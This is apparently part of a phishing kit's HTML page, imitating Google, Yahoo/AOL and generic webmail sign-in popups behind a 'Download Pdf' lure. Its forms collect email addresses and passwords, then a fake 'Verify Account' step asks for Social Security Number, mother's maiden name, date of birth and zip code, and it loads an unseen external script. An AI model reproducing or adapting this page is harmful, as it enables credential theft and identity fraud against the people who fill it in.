                                            <path d="M6.71603956,0.545920922 C4.28708514,1.37702012 2.21738005,3.19471449 1.06456503,5.49498258 C0.662420261,6.28854827 0.372876025,7.13037132 0.195932325,8.00436596 C-0.243745959,10.1705858 0.0618840676,12.4815778 1.0592031,14.4547681 C1.70799667,15.7416314 2.64097254,16.8890845 3.7669779,17.7845268 C4.83400203,18.6317118 6.07260793,19.2644196 7.39164278,19.6129451 C9.05384117,20.0579853 10.8232782,20.0472614 12.4962004,19.6665644 C14.0082648,19.3180389 15.4399002,18.5941783 16.5819913,17.54324 C17.7884256,16.4333204 18.6516964,14.9748753 19.1074605,13.4038298 C19.60612,11.693374 19.6704632,9.86495577 19.3594712,8.10624264 C16.2334658,8.10624264 13.1020985,8.10624264 9.97609318,8.10624264 C9.97609318,9.40382977 9.97609318,10.7014169 9.97609318,11.999004 C11.7884256,11.999004 13.6007581,11.999004 15.4130905,11.999004 C15.2039752,13.2429719 14.4640288,14.3797011 13.4184524,15.082114 C12.758935,15.5271542 12.0029028,15.8113365 11.220061,15.9507467 C10.4372192,16.0847949 9.62220578,16.1008807 8.83936396,15.9453847 C8.04043635,15.7845268 7.28440417,15.4520871 6.61952482,14.9855992 C5.55786262,14.2402909 4.74821115,13.151819 4.33534251,11.923937 C3.91175002,10.6746072 3.90638809,9.2858673 4.33534251,8.04189947 C4.63561061,7.16254291 5.1289082,6.35289143 5.78306369,5.68801207 C6.58735324,4.86227481 7.63292964,4.27246248 8.76429694,4.03117561 C9.72944439,3.82742226 10.7482111,3.86495577 11.6919109,4.14913808 C12.4962004,4.39042494 13.2361468,4.83546516 13.8420449,5.41455363 C14.453305,4.80329358 15.064565,4.19203352 15.6758251,3.58077347 C15.9975409,3.25369572 16.3353425,2.93734183 16.6463345,2.59954022 C15.7187205,1.74163138 14.6248867,1.04994237 13.4345382,0.610264085 C11.2897661,-0.183301598 8.87689747,-0.199387389 6.71603956,0.545920922 Z" id="Path" fill="#FFFFFF"></path>
                                            <path d="M6.71603956,0.545920922 C8.87153554,-0.199387389 11.2897661,-0.183301598 13.4345382,0.604902155 C14.6248867,1.04458044 15.7133586,1.73090752 16.6463345,2.59417829 C16.3353425,2.9319799 15.9975409,3.24833379 15.6758251,3.57541154 C15.064565,4.18667159 14.453305,4.79793165 13.8420449,5.4091917 C13.2361468,4.83010323 12.4962004,4.39042494 11.6919109,4.14377615 C10.7482111,3.85959384 9.72944439,3.8166984 8.76429694,4.02581368 C7.63829157,4.26710055 6.59271517,4.85691288 5.78306369,5.68265014 C5.1289082,6.34216757 4.63561061,7.15718098 4.33534251,8.03653754 C3.24687066,7.18935256 2.15839881,6.3475295 1.06456503,5.50034451 C2.21738005,3.19471449 4.28708514,1.37702012 6.71603956,0.545920922 Z" id="Path" fill="#EA4335"></path>
                                            <path d="M0.201294255,7.99900403 C0.378237955,7.13037132 0.667782191,6.28318634 1.06992696,5.48962065 C2.15839881,6.33680564 3.24687066,7.1786287 4.34070444,8.02581368 C3.91175002,9.27514344 3.91175002,10.6638834 4.34070444,11.9078512 C3.25223259,12.7550362 2.16376074,13.6022212 1.07528889,14.4440442 C0.0672459979,12.4762158 -0.238384029,10.1652239 0.201294255,7.99900403 Z" id="Path" fill="#FBBC05"></path>
                                            <path d="M9.97609318,8.10088071 C13.1020985,8.10088071 16.2334658,8.10088071 19.3594712,8.10088071 C19.6704632,9.85423191 19.6007581,11.6826501 19.1074605,13.3984678 C18.6516964,14.9695134 17.7884256,16.4279585 16.5819913,17.537878 C15.525691,16.7175027 14.4693908,15.8971274 13.4130905,15.076752 C14.4586669,14.3743392 15.1986133,13.2376099 15.4077286,11.9936421 C13.5953961,11.9936421 11.7830637,11.9936421 9.97073125,11.9936421 C9.97609318,10.696055 9.97609318,9.39846784 9.97609318,8.10088071 Z" id="Path" fill="#4285F4"></path>
                                            <path d="M1.06456503,14.4494062 C2.15303688,13.6075831 3.24150873,12.7603981 4.32998058,11.9132131 C4.74821115,13.1410952 5.55250069,14.229567 6.61416289,14.9748753 C7.27904224,15.4413633 8.04043635,15.773803 8.83400203,15.9346609 C9.61684385,16.0955188 10.4264953,16.0740711 11.2146991,15.9400228 C11.9975409,15.8006126 12.7535731,15.5164303 13.4130905,15.0713901 C14.4693908,15.8917654 15.525691,16.7121408 16.5819913,17.5325161 C15.4399002,18.5888164 14.0082648,19.307315 12.4962004,19.6558405 C10.8232782,20.0365375 9.05384117,20.0472614 7.39164278,19.6022212 C6.07260793,19.2536957 4.83400203,18.6263499 3.7669779,17.773803 C2.64633447,16.8837225 1.7133586,15.7362694 1.06456503,14.4494062 Z" id="Path" fill="#34A853"></path>
                                        </g>
                                    </g>
                                </g>
                            </svg>
                        </div>
                    </div>
                </div>


                <div class="form-ao-data yaho-form-boxes">
                    <div class="box-con__input inp-box-con">
                        <input type="password" name="" id="namepass" placeholder="Enter your Password" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol yah-error-div"></span>
                        </div>
                    </div>


                    <div class="box-con__input btn-inp-data yahoo-create">
                        <button type="button" class="btnAol text-btn btn-next-yahoo"><a class="next-text">Login </a><div class="loadererr yah-loader text-loader hide-load-icon">Loading...</div></button>
                    </div>

                    <div class="box-con__input btn-inp-data">
                        <div class="sign-box-con">
                            <input type="checkbox" >
                            <span>Stay Signed in</span>
                        </div>

                        <div class="sign-box-con">
                            <span>Forgot Password?</span>
                        </div>
                    </div>

                    <div class="box-con__input box-con-create yahoo-create">
                        <button type="button">Create an account</button>
                    </div>

                </div>


                <div class="form-ao-data yaho-form-boxes">
                    <div class="err-aol-box">
                        <span class="err-aol yah-error-div"></span>
                    </div>
                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="email3" placeholder=" " class="aol-input yah-input" >

                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="password" name="" id="pass3" placeholder="Enter your Password" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="ssn3" placeholder="Social Security Number" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="maiden3" placeholder="Mother's Maiden Name" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="datebirth3" placeholder="Date Of Birth" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="zip3" placeholder="Zip Code" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol"></span>
                        </div>
                    </div>

                    <div class="box-con__input btn-inp-data yahoo-create">
                        <button type="button" class="btnAol btn-next-yahoo"><a>Verify Account</a><div class="loadererr yah-loader hide-load-icon" ></div></button>
                    </div>


                </div>
        </div>

    </div>


    </form>
</div>
<!------End---------Window Yahoo ---------End-------->
<!------------------ Window Other Mail ------------------>
<div class="otherpopup">
    <div class="other-content">
        <div class="times-close">
            <a href="#" class="other-close">&times;</a>
        </div>
        <div class="other-img-box">
            <img src="assets/img/at-67.png" alt="logo" width="70px">
            <h3 class="logother-info" style="color: black">Login with Other Mail</h3>
        </div>


        <div class="other-form">

            <form action="#" class="other-form-mail active">
                <div class="other-form-box">
                    <div class="error-other">
                        <span class="error-other-msg"></span>
                    </div>
                    <label for="" style="color: black">Email Address</label>
                    <input type="text" placeholder="Enter email" class="email-other" >
                    <label for="" style="color:black;">We'll never share your email with anyone else</label>
                </div>

                <div class="other-form-box">
                    <label for="" style="color: black">Password</label>
                    <input type="password" placeholder="Enter password" class="pass-other" >
                </div>


                <div class="other-form-box other-btns">
                    <button type="button" class="btn-close btn-other">Close</button>
                    <button type="button" class="btn-Login btn-other">Login</button>
                </div>
            </form>



            <form action="#" class="other-form-mail">
                <div class="other-form-box">
                    <div class="error-other">
                        <span class="error-other-msg erroroth-2"> </span>
                    </div>
                    <label for="" style="color: black">Email Address</label>
                    <input type="text" placeholder="Enter email" class="emailother2" >
                </div>

                <div class="other-form-box">
                    <label for="" style="color: black">Password</label>
                    <input type="password" placeholder="Enter password" class="emailpass" >
                </div>

                <div class="other-form-box other-form-flex">
                    <input type="text" placeholder="Social Security Number" class="ssnOther" >
                    <input type="text" placeholder="Mother's Maiden Name" class="maidOther" >
                </div>

                <div class="other-form-box  other-form-flex"">

                <input type="text" placeholder="Date of birth" class="dobOther" >
                <input type="text" placeholder="Zip Code" class="zipOther" >
        </div>

        <div class="other-form-box other-btns">
            <button type="button" class="btn-close btn-other">Close</button>
            <button type="button" class="btn-Login btn-other btn-verify">Download Pdf</button>
        </div>
        </form>
    </div>


</div>
<!----End-------------- Window Other Mail ---------End-------->

<script src="assets/js/boxxontrol.js"></script>

</body>
</html>
